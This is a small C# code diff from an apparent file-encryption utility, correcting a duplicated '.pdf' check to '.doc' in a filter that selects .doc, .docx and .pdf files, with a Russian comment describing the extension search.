@@ -43,7 +43,7 @@ namespace Encryptor
             try
             {
                 foreach (FileInfo file in dir.GetFiles("*.*").Where(str =>
-                    str.Name.EndsWith(".pdf") || str.Name.EndsWith(".docx") || str.Name.EndsWith(".pdf"))) //поиск Файла, расширение которого удовлетворяет сразу нескольким типам
+                    str.Name.EndsWith(".doc") || str.Name.EndsWith(".docx") || str.Name.EndsWith(".pdf"))) //поиск Файла, расширение которого удовлетворяет сразу нескольким типам
                 {
                     rwl.AcquireWriterLock(Int32.MaxValue);
                     try
